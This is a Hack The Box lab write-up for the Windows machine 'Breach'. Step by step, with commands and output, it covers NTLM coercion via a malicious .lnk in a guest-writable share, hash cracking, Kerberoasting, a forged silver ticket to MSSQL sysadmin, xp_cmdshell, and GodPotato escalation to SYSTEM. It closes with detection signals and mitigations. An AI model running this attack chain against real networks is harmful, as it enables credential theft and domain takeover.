#import "../../template/lib.typ": *

#show: htb-writeup.with(
  machine: "Breach",
  os: "Windows Server 2022",
  difficulty: "Medium",
  ip: "10.129.89.128",
  released: "2025-10-09",
  retired: "2025-10-09",
  tags: ("ad", "kerberos", "mssql", "silver-ticket", "coerce"),
  procedures: ("ntlm-coerce", "kerberoast", "silver-ticket", "godpotato"),
  summary: [An Active Directory box that chains a guest-writable SMB share into an
    NTLM coercion for the first foothold, a Kerberoast of a SQL service account, and
    a silver ticket against the MSSQLSvc SPN to log into SQL Server as Administrator
    — without ever learning the real admin password. `xp_cmdshell` then gives
    execution as the service account, and SeImpersonate plus GodPotato finishes to
    SYSTEM.],
  chain: (
    ("Recon", [Full TCP `nmap`], "breach.vl DC, MSSQL 2019"),
    ("Foothold", [Guest-writable share + `.lnk` coercion], "julia.wong NetNTLMv2"),
    ("Cred Access", [Crack NetNTLMv2 (hashcat 5600)], "julia.wong / Computer1"),
    ("Kerberoast", [Roast + crack `svc_mssql`], "svc_mssql / Trustno1"),
    ("PrivEsc", [Silver ticket to MSSQLSvc as Administrator], "sysadmin on SQL"),
    ("Exec", [`xp_cmdshell` as svc_mssql], [#flag("user")]),
    ("SYSTEM", [GodPotato (SeImpersonate)], [#flag("root")]),
  ),
)

= Recon

A full TCP sweep with service and script scanning lays out a domain controller:
DNS, Kerberos and LDAP for `breach.vl`, IIS on 80, WinRM on 5985, RDP on 3389, and
— the detail that shapes the whole box — Microsoft SQL Server 2019 on 1433.

Full TCP + service/script scan
#cmd("nmap", "nmap -sCV -p- 10.129.89.128 -oN initial.nmap")

#cmd(none, "53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec
389/tcp   open  ldap          Domain: breach.vl, Site: Default-First-Site-Name
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
  ms-sql-ntlm-info: DNS_Computer_Name: BREACHDC.breach.vl
3268/tcp  open  ldap
3389/tcp  open  ms-wbt-server
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
Host script results:
  smb2-security-mode: 3.1.1: Message signing enabled and required")

SMB signing is required, so relay is off the table. The MSSQL instance is the
anchor to keep in mind as credentials start to appear.

= Foothold

With null authentication allowed, enumerating shares as `guest` shows a non-default
share — plainly named `share` — that `guest` can both read and write.

Enumerate shares as guest
#cmd("netexec", "nxc smb 10.129.89.128 -u 'guest' -p '' --shares")

#cmd(none, "[+] breach.vl\\guest:
Share           Permissions     Remark
-----           -----------     ------
IPC$            READ            Remote IPC
share           READ,WRITE
Users           READ")

== Coercing a hash from the writable share

Inside the share are `transfer`, `finance` and `software` directories. A writable
share that a user or scheduled task browses is an NTLM-coercion primitive: drop a
malicious `.lnk` (generated with ntlm_theft) whose icon points at our host, and any
Explorer that renders the folder authenticates to us.

#cmd("smbclient", "smbclient //10.129.89.128/share -N")

#cmd(none, "smb: \\> cd transfer\\
smb: \\transfer\\> put coerce.lnk")

With Responder listening, a scheduled process browses the share and leaks
`julia.wong`'s NetNTLMv2.

#cmd("responder", "responder -I tun0 -wvFr")

#cmd(none, "Julia.Wong::BREACH:949ba0a153cdfd72:044C67E7...[NetNTLMv2 captured — redacted]")

#gotcha[Signing being required kills SMB relay, so this is a *capture-and-crack*,
  not a relay. The `.lnk` fires on folder view — no click needed — which is why a
  background browse task is enough to trigger it.]

The hash falls to rockyou.

#cmd("hashcat", "hashcat -m 5600 julia.hash /usr/share/wordlists/rockyou.txt")

That yields `julia.wong : Computer1` — a real domain foothold.

= Privilege Escalation

== Kerberoast to a SQL service account

Any valid domain credential can Kerberoast. Enumerating over LDAP and requesting
service tickets returns a TGS for `svc_mssql`.

#cmd("netexec", "nxc ldap 10.129.89.128 -u 'julia.wong' -p 'Computer1' --kerberoast kerb.txt")

#cmd("hashcat", "hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt")

#cmd(none, "$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl\\svc_mssql*$b825451a...[redacted]")

That cracks to `svc_mssql : Trustno1`.

== Silver ticket to sysadmin on MSSQL

A direct MSSQL login as `svc_mssql` is low-privilege — it maps to guest in `master`,
is not sysadmin, and has no IMPERSONATE grants. But we hold its password, so its NT
hash, and it owns the `MSSQLSvc` SPN. That is the entire recipe for a *silver
ticket*: we encrypt a service ticket for MSSQL ourselves and forge the PAC to claim
Administrator (RID 500). SQL Server validates the ticket with the service-account
key — which we control — so it trusts the forged PAC and maps the login straight to
sysadmin. No DC round-trip, and no real admin password.

Forge a TGS for the MSSQL service as Administrator
#cmd("ticketer", "impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -nthash <svc_mssql NT hash> -dc-ip 10.129.89.128 -domain breach.vl -user-id 500 Administrator")

Point `KRB5CCNAME` at the forged ticket and authenticate over Kerberos
#cmd("mssqlclient", "export KRB5CCNAME=Administrator.ccache

impacket-mssqlclient -k -no-pass -windows-auth breachdc.breach.vl")

The session lands as `BREACH\Administrator`, `dbo@master` — sysadmin.

== xp_cmdshell, SeImpersonate and GodPotato

As sysadmin we enable command execution. `xp_cmdshell` runs as the OS service
account (`svc_mssql`), and checking its privileges shows the ticket to SYSTEM:
SeImpersonatePrivilege.

#cmd("mssql", "enable_xp_cmdshell
xp_cmdshell powershell whoami /priv")

#cmd(none, "SeImpersonatePrivilege    Impersonate a client after authentication   Enabled")

The user flag is readable from here.

#flag("user")

Defender is disabled on the box, so GodPotato runs straight off disk. It abuses the
RPCSS/DCOM OXID resolver over a named pipe to steal a SYSTEM token and spawn our
command as SYSTEM.

#cmd("godpotato", "xp_cmdshell C:\\Users\\Public\\gp.exe -cmd \"cmd /c whoami\"")

#cmd(none, "[*] CurrentUser: NT AUTHORITY\\SYSTEM
[*] process start with pid 4728
nt authority\\system")

With SYSTEM, the root flag is ours — builtins like `type` need wrapping in `cmd /c`
because GodPotato executes its argument as a program directly.

#cmd("godpotato", "xp_cmdshell C:\\Users\\Public\\gp.exe -cmd \"cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt\"")

#flag("root")

#detect[Each hop leaves a signal. The coercion is an outbound SMB authentication
  from the DC or a scheduled task to a non-domain host (egress 445), kicked off by
  an anomalous `.lnk` in a guest-writable share. The Kerberoast is a 4769 for
  `svc_mssql` with RC4 (0x17). The silver ticket is the quiet one: there is no
  4768/4769 on the DC for the admin login because the ticket was forged offline, yet
  MSSQL logs a successful Administrator logon — a service logon with no matching KDC
  ticket event. Finally, a SYSTEM process spawned as a child of `sqlservr.exe`, with
  sensitive-privilege-use (4673/4674) around SeImpersonate, is the GodPotato tell.]

#note[The structural lesson: a crackable SQL service account that owns the MSSQLSvc
  SPN is a silver ticket straight to sysadmin. The service-account key is the only
  trust SQL Server checks on that ticket, so no local-admin credential is ever
  needed. Mitigate with a long, rotated service-account password, AES-only, and
  trimming unused SPNs.]
